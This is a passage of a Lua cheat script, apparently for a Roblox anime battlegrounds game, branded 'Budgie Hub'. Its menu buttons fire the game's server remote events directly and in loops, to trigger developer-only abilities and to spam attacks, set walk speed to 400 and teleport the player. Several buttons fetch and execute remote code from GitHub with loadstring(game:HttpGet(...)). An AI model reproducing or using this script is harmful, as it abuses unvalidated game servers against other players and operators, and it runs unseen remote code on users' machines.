        hasTool = true
        break
    end
end

if not hasTool then
  local function F1()
    local args = {
    [1] = "Gojo Satoru"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "One Six Eyes" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("One Six Eyes").Script.Event:FireServer()
  end
  
  local function F2()
wait(6)
game:GetService("Players").LocalPlayer.Backpack["Infinity Void"].Skill.InfinityVoid:FireServer()
end
  
  F1()
  F2()
end

if hasTool then
game:GetService("Players").LocalPlayer.Backpack["Infinity Void"].Skill.InfinityVoid:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Gojo Unlimited Void",
 Callback = function()
        local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Six Eyes" then
        hasTool = true
        break
    end
end

if not hasTool then
  local function F1()
    local args = {
    [1] = "Gojo Satoru"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "One Six Eyes" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("One Six Eyes").Script.Event:FireServer()
  end
  
  local function F2()
wait(6)
game:GetService("Players").LocalPlayer.Backpack["Unlimited Void 0,2s"].Domain.Event:FireServer()
end
  
  F1()
  F2()
end

if hasTool then
game:GetService("Players").LocalPlayer.Backpack["Unlimited Void 0,2s"].Domain.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "All Range Atomic",
 Callback = function()
        local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "All Range Atomic" or tool.Name == "AtomicFolder" then
        hasTool = true
        break
    end
end

if not hasTool then
  local args = {
    [1] = "Cid Kagenou"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "All Range Atomic" or v.Name == "AtomicFolder" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("AtomicFolder"):WaitForChild("Event"):FireServer() 
  end

if hasTool then
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "All Range Atomic" or v.Name == "AtomicFolder" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("AtomicFolder"):WaitForChild("Event"):FireServer() 
end
   end    
})

Tab:AddButton({
 Name = "Rengoku Fire Dragon",
 Callback = function()
        local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Rengoku" then
        hasTool = true
        break
    end
end

if not hasTool then
  local function F1()
    local args = {
    [1] = "Kyojuro Rengoku"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
game:GetService("Players").LocalPlayer.Backpack.Rengoku.Ground.Event:FireServer()
end

if hasTool then
game:GetService("Players").LocalPlayer.Backpack.Rengoku.Ground.Event:FireServer()
end
end
   end    
})

Tab:AddButton({
 Name = "Zenitsu Sixfold",
 Callback = function()
        local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Sixfold" then
        hasTool = true
        break
    end
end

if not hasTool then
  local args = {
    [1] = "Zenitsu Agatsuma"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack.Sixfold.Sixfold.Fire:FireServer()
end
  end

if hasTool then
for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack.Sixfold.Sixfold.Fire:FireServer()
end
end
   end    
})

Tab:AddButton({
 Name = "<p><font size='20'>Error 404: Failed to load button</font></p>",
 Callback = function()
error("Defunct term")
   end    
})

Tab:AddButton({
 Name = "Rengoku Divine Rengoku",
 Callback = function()
        local args = {
    [1] = "Kyojuro Rengoku"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.5)
for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack.Rengoku.Ground.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Akaza Compass Needle",
 Callback = function()
        local args = {
    [1] = "Akaza"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.5)
for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Compass Needle"].Akaza.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Serious Punch",
 Callback = function()
        local args = {
    [1] = "Saitama"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(1)
for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Serious Punch"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Sukuma Boxing Arena",
 Callback = function()
local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Boxing Arena" or tool.Name == "Sukuna" then
        hasTool = true
        break
    end
end

if not hasTool then
  local args = {
    [1] = "Yuji Itadori"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Boxing Arena" or v.Name == "RingOfDeath" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Boxing Arena").Skill.RingOfDeath:FireServer()
  end

if hasTool then
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Boxing Arena" or v.Name == "RingOfDeath" then
       v.Parent = LP.Character
   end
end
wait(0.1)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Boxing Arena").Skill.RingOfDeath:FireServer()
end
  end
})

Tab:AddDropdown({
	Name = "Guytaro(OP)",
	Default = "1",
	Options = {"Input Gyutaro", "Spam Rampant Arc", "Quick Spam Rampant Arc", "Off Spam"},
	Callback = function(Value)
if Value == "Input Gyutaro" then
local args = {
    [1] = "Gyutaro"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
end
		if Value == "Spam Rampant Arc" then
local CfD = true
		local args = {
    [1] = "Gyutaro"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Rampant Arc" then
       v.Parent = LP.Character
   end
end

wait(0.3)
repeat
  wait(0.1)
 if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc") then
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc").Keybind.Fire:FireServer()
  end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 or CfD == false
		end
		if Value == "Quick Spam Rampant Arc" then
local CfD = true
		local args = {
    [1] = "Gyutaro"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Rampant Arc" then
       v.Parent = LP.Character
   end
end

wait(0.3)
repeat
  game:GetService("RunService").RenderStepped:Wait()
 if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc") then
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc").Keybind.Fire:FireServer()
  end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 or CfD == false
		end
if Value == "Off Spam" then
local CfD = false
end
	end    
})

Tab:AddButton({
 Name = "Summon Mahoraga",
 Callback = function()
        local args = {
    [1] = "Megumi Fushiguro"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.3)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Summon Mahoraga" then
       v.Parent = LP.Character
   end
end

wait(0.4)
repeat wait(0.3)
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local targetPosition = mouse.Hit.Position
 if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Summon Mahoraga") then
local args = {
    [1] = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z)
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Summon Mahoraga").Use.RemoteEvent:FireServer(unpack(args))
  end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Denji Transformation",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Chainsaw_Man_RS_Folder"):WaitForChild("Remotes"):WaitForChild("Transform_RE"):FireServer()
   end    
})

    Tab:AddDropdown({
	Name = "Collaretal Ruin",
	Default = "1",
	Options = {"Collaretal Ruin", "Powerful Collaretal Ruin"},
	Callback = function(Value)
		if Value == "Collaretal Ruin" then
local user = game.Players.LocalPlayer
if user.UserId == 5199937747 or user.UserId == 5042713445 or user.UserId == 6036506267 then
		game:GetService("ReplicatedStorage").Kj.Remotes["Collaretal Ruin"]:FireServer()
else
OrionLib:MakeNotification({
	Name = "Budgie Hub",
	Content = "Insufficient rights",
	Image = "rbxassetid://4483345998",
	Time = 5
})
end
		elseif Value == "Powerful Collaretal Ruin" then
local user = game.Players.LocalPlayer
if user.UserId == 5199937747 or user.UserId == 5042713445 or user.UserId == 6036506267 then

                for i = 1, 8 do
    game:GetService("ReplicatedStorage").Kj.Remotes["Collaretal Ruin"]:FireServer()
end
else
OrionLib:MakeNotification({
	Name = "Budgie Hub",
	Content = "Insufficient rights",
	Image = "rbxassetid://4483345998",
	Time = 5
})
end
		end
	end    
})

    Tab:AddDropdown({
	Name = "20-20-20 Dropkick",
	Default = "1",
	Options = {"20-20-20 Dropkick", "Supersonic 20-20-20 Dropkick"},
	Callback = function(Value)
		if Value == "20-20-20 Dropkick" then
local user = game.Players.LocalPlayer
if user.UserId == 5199937747 or user.UserId == 5042713445 or user.UserId == 6036506267 then
		game:GetService("ReplicatedStorage").KJ.Remote.DropKick:FireServer()
else
OrionLib:MakeNotification({
	Name = "Budgie Hub",
	Content = "Insufficient rights",
	Image = "rbxassetid://4483345998",
	Time = 5
})
end
		elseif Value == "Supersonic 20-20-20 Dropkick" then
local user = game.Players.LocalPlayer
if user.UserId == 5199937747 or user.UserId == 5042713445 or user.UserId == 6036506267 then
		local function ui()
    local counte = 1
    repeat wait(0.5)
        counte = counte + 1
        local player = game.Players.LocalPlayer
        local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 80)
        local foundEntity = false
        for _, part in ipairs(parts) do
            if (part:IsA("BasePart") or part:IsA("UnionOperation") or part:IsA("Model")) and not part.Anchored and part:IsDescendantOf(workspace) and not part:IsDescendantOf(player.Character) then
                foundEntity = true
                if part then
                    player.Character:SetPrimaryPartCFrame(part.CFrame)
                end
                break
            end
        end
        if foundEntity then
            -- Do something when an entity is found
        else
            -- Do something when no entity is found
        end
    until counte == 10
end

local function increaseSpeed()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    local humanoid = character:FindFirstChildWhichIsA("Humanoid")

    local count = 1
    repeat task.wait()
        count = count + 1
        humanoid.WalkSpeed = 400
    until count == 210
    wait()
    humanoid.WalkSpeed = 16
end

for i = 1, 3 do  
game:GetService("ReplicatedStorage").KJ.Remote.DropKick:FireServer()
end

wait(2)

coroutine.wrap(ui)()
coroutine.wrap(increaseSpeed)()
else
OrionLib:MakeNotification({
	Name = "Budgie Hub",
	Content = "Insufficient rights",
	Image = "rbxassetid://4483345998",
	Time = 5
})
end
		end
	end    
})

Tab:AddButton({
 Name = "Megumin",
 Callback = function()
local user = game.Players.LocalPlayer
if user.UserId == 5199937747 or user.UserId == 5042713445 or user.UserId == 6036506267 then
        game:GetService("ReplicatedStorage").Megumin.Remote:FireServer()
else
OrionLib:MakeNotification({
	Name = "Budgie Hub",
	Content = "Insufficient rights",
	Image = "rbxassetid://4483345998",
	Time = 5
})
end
   end    
})

Tab:AddButton({
 Name = "Bad dog",
 Callback = function()
        game:GetService("ReplicatedStorage").AtomicFolder.gaydog:FireServer()
   end    
})

Tab:AddDropdown({
	Name = "Cosmic abilities",
	Default = "1",
	Options = {"Supernova", "Hypernova", "Black Hole", "Star of Death"},
	Callback = function(Value)
		if Value == "Supernova" then
		for i = 1, 500 do
local args = {
    [1] = false,
    [2] = Vector3.new(math.random(-1e3, 1e3), 10, math.random(-1e3, 1e3))
}
game:GetService("ReplicatedStorage"):WaitForChild("Kamehameha"):WaitForChild("Remotes"):WaitForChild("KamehamehaEvent"):FireServer(unpack(args))
end
		end
		if Value == "Hypernova" then
		for i = 1, 100 do
local ohString1 = "FinalHollowPurple"
game:GetService("ReplicatedStorage").Events.Abilitys.Gojo:FireServer(ohString1)
end
		end
		if Value == "Black Hole" then
		local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Chimera Shadow Garden" or tool.Name == "Sukuna" then
        hasTool = true
        break
    end
end

if not hasTool then
 local ohString1 = "Megumi / Sukuna"

game:GetService("ReplicatedStorage").Picked:FireServer(ohString1)
  wait(0.3)
for i = 1, 60 do
game:GetService("Players").LocalPlayer.Backpack["Chimera Shadow Garden"].Use.RemoteEvent:FireServer()
end
  end

if hasTool then
for i = 1, 60 do
game:GetService("Players").LocalPlayer.Backpack["Chimera Shadow Garden"].Use.RemoteEvent:FireServer()
end
end
		end
		if Value == "Star of Death" then
		local function One()
local spinSpeed = 20
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
Spin.MaxTorque = Vector3.new(0, math.huge, 0)
Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
local ohString1 = "Ichigo Vasto Lorde"
game:GetService("ReplicatedStorage").Picked:FireServer(ohString1)
  wait(0.1)
for i = 1, 100 do
 wait()
  game:GetService("Players").LocalPlayer.Backpack.Cero.LocalScript.Event:FireServer()
 end
end

local function Two()
speaker = game.Players.LocalPlayer
for i,v in pairs(speaker.Character:GetDescendants()) do
  if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
   v:Destroy()
  end
 end
end

One()
Two()
		end
	end    
})

    Tab:AddDropdown({
	Name = "Maximum Output Blue",
	Default = "1",
	Options = {"Default", "Strong"},
    Callback = function(Value)
        if Value == "Default" then
            local ohTable1 = {
                ["Function"] = "Fire",
                ["Name"] = "BlueMo",
                ["rootpos"] = CFrame.new(39.0846443, 19.8230076, -162.294754, -0.0822739899, 3.01816527e-08, 0.996609747,
                    -4.96030914e-08, 1, -3.43792514e-08, -0.996609747, -5.22634416e-08, -0.0822739899)
            }

            game:GetService("ReplicatedStorage").Server:InvokeServer(ohTable1)
        end
        if Value == "Strong" then
                    for i = 1, 10 do
local ohTable1 = {
    ["Function"] = "Fire",
    ["Name"] = "BlueMo",
    ["rootpos"] = CFrame.new(39.0846443, 19.8230076, -162.294754, -0.0822739899, 3.01816527e-08, 0.996609747, -4.96030914e-08, 1, -3.43792514e-08, -0.996609747, -5.22634416e-08, -0.0822739899)
}

game:GetService("ReplicatedStorage").Server:InvokeServer(ohTable1)
        end
    end
	end    
})

local Section = Tab:AddSection({
	Name = "Custom Characters"
})

Tab:AddButton({
 Name = "Ultimate Hakari",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_LuckyStrike/main/Tool"))()
   end    
})

Tab:AddButton({
 Name = "Cyborg",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_Cyborg/main/Character"))()
   end    
})

Tab:AddButton({
 Name = "Memeus",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_Memeus/main/Character"))()
   end    
})

Tab:AddButton({
 Name = "The Strongest Sukuna",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_True-Sukuna/main/Character"))()
   end    
})

Tab:AddButton({
 Name = "True Kenjaku(Happy birthday)",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_True-Kenjaku/main/Character"))()
   end    
})

local Tab = Window:MakeTab({
	Name = "Dev ability's",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddDropdown({
	Name = "Blue2",
	Default = "1",
	Options = {"Blue2", "Powerful Blue2"},
	Callback = function(Value)
		if Value == "Blue2" then
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Blue2"):FireServer()
		end
		if Value == "Powerful Blue2" then
	for i = 1, 10 do
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Blue2"):FireServer()
	end
		end
	end    
})

Tab:AddDropdown({
	Name = "Beatdown",
	Default = "1",
	Options = {"Beatdown", "Powerful Beatdown"},
	Callback = function(Value)
		if Value == "Beatdown" then
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Beatdown"):FireServer()
		end
		if Value == "Powerful Beatdown" then
		for i = 1, 20 do
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Beatdown"):FireServer()
		end
		end
	end    
})

Tab:AddDropdown({
	Name = "Red2",
	Default = "1",
	Options = {"Red2", "Powerful Red2"},
	Callback = function(Value)
		if Value == "Red2" then
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Red2"):FireServer()
		end
		if Value == "Powerful Red2" then
		for i = 1, 10 do
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Red2"):FireServer()
		end
		end
	end    
})

Tab:AddDropdown({
	Name = "KickSlam",
	Default = "1",
	Options = {"KickSlam", "Powerful KickSlam"},
	Callback = function(Value)
		if Value == "KickSlam" then
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("KickSlam"):FireServer()
		end
		if Value == "Powerful KickSlam" then
		for i = 1, 15 do
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("KickSlam"):FireServer()
		end
		end
	end    
})

Tab:AddDropdown({
	Name = "Container",
	Default = "1",
	Options = {"Container", "Powerful Container"},
	Callback = function(Value)
		if Value == "Container" then
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Container"):FireServer()
		end
		if Value == "Powerful Container" then
		for i = 1, 30 do
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Container"):FireServer()
		end
		end
	end    
})

Tab:AddButton({
 Name = "CC",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("CombatAssets"):WaitForChild("Remotes"):WaitForChild("CC"):FireServer()
   end    
})

Tab:AddButton({
 Name = "AfterImageEvent",
 Callback = function()
        game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
   end    
})

Tab:AddButton({
 Name = "Domain0.2",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Domain0.2"):FireServer()
   end    
})

local lastPressTime = 0
Tab:AddDropdown({
	Name = "MalevolentShine2",
	Default = "1",
	Options = {"MalevolentShine2", "Powerful MalevolentShine2"},
	Callback = function(Value)
		if Value == "MalevolentShine2" then
		game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("MalevolentShrine2"):FireServer()
		end
		if Value == "Powerful MalevolentShine2" then
  local currentTime = tick()
            if currentTime - lastPressTime >= 2 then
                lastPressTime = currentTime 
                for i = 1, 15 do
		game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("MalevolentShrine2"):FireServer()
		end
            else
                OrionLib:MakeNotification({
 Name = "Budgie Hub",
 Content = "Too fast please wait",
 Image = "rbxassetid://4483345998",
 Time = 5
})
            end
		end
	end    
})

Tab:AddDropdown({
	Name = "Denji Move",
	Default = "1",
	Options = {"Transform_RE", "M1_RS_Folder"},
	Callback = function(Value)
if Value == "Transform_RE" then
game:GetService("ReplicatedStorage").Chainsaw_Man_RS_Folder.Remotes.Transform_RE:FireServer()
end
if Value == "M1_RS_Folder" then
game:GetService("ReplicatedStorage").Chainsaw_Man_RS_Folder.Remotes.M1_RE:FireServer()
end
      end
})

Tab:AddDropdown({
	Name = "20-20-20 Dropkick",
	Default = "1",
	Options = {"20-20-20 Dropkick", "Supersonic 20-20-20 Dropkick"},
	Callback = function(Value)
		if Value == "20-20-20 Dropkick" then	
game:GetService("ReplicatedStorage").KJ.Remote.DropKick:FireServer()
		elseif Value == "Supersonic 20-20-20 Dropkick" then
		local function ui()
    local counte = 1
    repeat wait(0.5)
        counte = counte + 1
        local player = game.Players.LocalPlayer
        local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 80)
        local foundEntity = false
        for _, part in ipairs(parts) do
            if (part:IsA("BasePart") or part:IsA("UnionOperation") or part:IsA("Model")) and not part.Anchored and part:IsDescendantOf(workspace) and not part:IsDescendantOf(player.Character) then
                foundEntity = true
                if part then
                    player.Character:SetPrimaryPartCFrame(part.CFrame)
                end
                break
            end
        end
        if foundEntity then
            -- Do something when an entity is found
        else
            -- Do something when no entity is found
        end
    until counte == 10
end

local function increaseSpeed()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    local humanoid = character:FindFirstChildWhichIsA("Humanoid")

    local count = 1
    repeat task.wait()
        count = count + 1
        humanoid.WalkSpeed = 400
    until count == 210
    wait()
    humanoid.WalkSpeed = 16
end

for i = 1, 3 do  
game:GetService("ReplicatedStorage").KJ.Remote.DropKick:FireServer()
end

wait(2)

coroutine.wrap(ui)()
coroutine.wrap(increaseSpeed)()
		end
	end    
})

Tab:AddButton({
 Name = "Megumin",
 Callback = function()
        game:GetService("ReplicatedStorage").Megumin.Remote:FireServer()
   end    
})

Tab:AddDropdown({
	Name = "Collaretal Ruin",
	Default = "1",
	Options = {"Basic", "Powerful"},
	Callback = function(Value)
		if Value == "Basic" then
		game:GetService("ReplicatedStorage").Kj.Remotes["Collaretal Ruin"]:FireServer()
		elseif Value == "Powerful" then
   for i = 1, 10 do
   game:GetService("ReplicatedStorage").Kj.Remotes["Collaretal Ruin"]:FireServer()
   end
		end
	end    
})

Tab:AddButton({
 Name = "Old Domain Hakari",
 Callback = function()
        game:GetService("ReplicatedStorage").Domainthing:FireServer()
   end    
})

Tab:AddButton({
 Name = "Mahito Domain",
 Callback = function()
        game:GetService("ReplicatedStorage").MahitoDomainExpansion.MahitoDomainEvent:FireServer()
   end    
})

Tab:AddDropdown({
	Name = "Ultra Beatdown",
	Default = "",
	Options = {"Basic", "Powerful"},
	Callback = function(Value)
		if Value == "Basic" then
game:GetService("ReplicatedStorage").Idk:FireServer()
		else
		for i = 1, 5 do
game:GetService("ReplicatedStorage").Idk:FireServer()
end
		end
	end    
})

Tab:AddButton({
 Name = "Atomic Slash",
 Callback = function()
        game:GetService("ReplicatedStorage").CidKageeno.Blinkk:FireServer()
   end    
})

Tab:AddDropdown({
	Name = "Sukuna2 rush",
	Default = "1",
	Options = {"Basic", "Powerful"},
	Callback = function(Value)
	     if Value == "Basic" then
game:GetService("ReplicatedStorage").sukuna.remotes.rush:FireServer()
	else
	for i = 1, 9 do
game:GetService("ReplicatedStorage").sukuna.remotes.rush:FireServer()
end
	    end
	end    
})

Tab:AddDropdown({
	Name = "Sukuna2 dismantle",
	Default = "",
	Options = {"Basic", "Powerful"},
	Callback = function(Value)
		if Value == "Basic" then
game:GetService("ReplicatedStorage").sukuna.remotes.dismantle:FireServer()
		else
		for i = 1, 15 do
game:GetService("ReplicatedStorage").sukuna.remotes.dismantle:FireServer()
end
		end
	end    
})

Tab:AddButton({
 Name = "20-20-20 dropkick 2",
 Callback = function()
        game:GetService("ReplicatedStorage").Remotes.Skill.KJ.Dropkick:FireServer()
   end    
})

Tab:AddButton({
 Name = "Troll",
 Callback = function()
        game:GetService("ReplicatedStorage").Remote.Troll:FireServer()
   end    
})

Tab:AddDropdown({
	Name = "Colovo",
	Default = "",
	Options = {"Basic", "Powerful"},
	Callback = function(Value)
		if Value == "Basic" then
game:GetService("ReplicatedStorage").Remotes.colovo:FireServer()
		else
	for i = 1, 15 do
	game:GetService("ReplicatedStorage").Remotes.colovo:FireServer()
	end
		end
	end    
})

local lastPressTime = 0
Tab:AddDropdown({
	Name = "Malevolent Shrine 3",
	Default = "",
	Options = {"Basic", "Powerful"},
	Callback = function(Value)
		if Value == "Basic" then
	game:GetService("ReplicatedStorage").Events.shrine:FireServer()
		else
	local currentTime = tick()
            if currentTime - lastPressTime >= 2 then
                lastPressTime = currentTime 
                for i = 1, 10 do
                   game:GetService("ReplicatedStorage").Events.shrine:FireServer()
                end
            else
                OrionLib:MakeNotification({
 Name = "Budgie Hub",
 Content = "Too fast please wait",
 Image = "rbxassetid://4483345998",
 Time = 5
})
            end
        end
	end    
})

Tab:AddButton({
 Name = "Old Domain Breaker",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("DomainSlashes"):FireServer()
   end    
})

local lastPressTime = 0
Tab:AddDropdown({
	Name = "Ryoman Sukuna Domain",
	Default = "",
	Options = {"Basic", "Powerful"},
	Callback = function(Value)
		if Value == "Basic" then
	game:GetService("ReplicatedStorage").RyomenSukuna.MalevolentShrine.Gaymalev:FireServer()
		else
	local currentTime = tick()
            if currentTime - lastPressTime >= 5 then
                lastPressTime = currentTime 
                for i = 1, 10 do
                   game:GetService("ReplicatedStorage").RyomenSukuna.MalevolentShrine.Gaymalev:FireServer()
                end
            else
                OrionLib:MakeNotification({
 Name = "Budgie Hub",
 Content = "Too fast please wait",
 Image = "rbxassetid://4483345998",
 Time = 5
})
            end
        end
	end    
})

local lastPressTime = 0
Tab:AddButton({
 Name = "Test Domain",
 Callback = function()
        local currentTime = tick()
            if currentTime - lastPressTime >= 0.5 then
                lastPressTime = currentTime 
                game:GetService("ReplicatedStorage").Gogay:FireServer()
            else
                OrionLib:MakeNotification({
 Name = "Budgie Hub",
 Content = "Spam does nothing",
 Image = "rbxassetid://4483345998",
 Time = 5
})
            end
   end    
})

Tab:AddButton({
 Name = "New 20-20-20 Dropkick",
 Callback = function()
        game:GetService("ReplicatedStorage").KJgay.Remote.DropKick:FireServer()
   end    
})

Tab:AddButton({
 Name = "Deleting Lapse Blue(SSC)",
 Callback = function()
        game:GetService("ReplicatedStorage").Gadgets.LapseBlueRemote:InvokeServer()
   end    
})

Tab:AddButton({
 Name = "Deleting Infinity(SSC)",
 Callback = function()
        local ohTable1 = {
    ["Function"] = "Fire",
    ["Name"] = "Infinity",
    ["rootpos"] = CFrame.new(39.0846443, 19.8230076, -162.294754, -0.0822739899, 3.01816527e-08, 0.996609747, -4.96030914e-08, 1, -3.43792514e-08, -0.996609747, -5.22634416e-08, -0.0822739899)
}

game:GetService("ReplicatedStorage").Server:InvokeServer(ohTable1)
   end    
})

Tab:AddButton({
 Name = "Vanishaizen",
 Callback = function()
        game:GetService("ReplicatedStorage").Remotes.Vanishaizen:FireServer()
   end    
})

Tab:AddButton({
 Name = "Malevolent Shrine 4",
 Callback = function()
        game:GetService("ReplicatedStorage").Events.Malclash:FireServer()
   end    
})

Tab:AddButton({
 Name = "Jujutsu Shenanigans Infinity Void",
 Callback = function()
        game:GetService("ReplicatedStorage").Events.UnlimitedVoid:FireServer()
   end    
})

Tab:AddButton({
 Name = "New Domain 0.2",
 Callback = function()
        game:GetService("ReplicatedStorage").Events["UnlimitedVoid0.2"]:FireServer()
   end    
})

Tab:AddButton({
 Name = "Jujutsu Shenanigans Malevolent Shrine",
 Callback = function()
        game:GetService("ReplicatedStorage").Events.MalevolentShrine5:FireServer()
   end    
})

Tab:AddDropdown({
	Name = "Gojo v3 Max Red",
	Default = "",
	Options = {"Basic", "Powerful"},
	Callback = function(Value)
		if Value == "Basic" then
game:GetService("ReplicatedStorage").GojoV3.maxred:FireServer()
		elseif Value == "Powerful" then
		for i = 1, 5 do
game:GetService("ReplicatedStorage").GojoV3.maxred:FireServer()
end
		end
	end    
})

Tab:AddDropdown({
	Name = "Gojo v3 Max Blue",
	Default = "",
	Options = {"Basic", "Powerful"},
	Callback = function(Value)
		if Value == "Basic" then
game:GetService("ReplicatedStorage").GojoV3.maxblue:FireServer()
		elseif Value == "Powerful" then
		for i = 1, 10 do
game:GetService("ReplicatedStorage").GojoV3.maxblue:FireServer()
end
		end
	end    
})

Tab:AddButton({
 Name = "Powerful Pure Love",
 Callback = function()
        for i = 1, 7 do
        game:GetService("ReplicatedStorage").Yuta.love:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Powerful Gojo Rush",
 Callback = function()
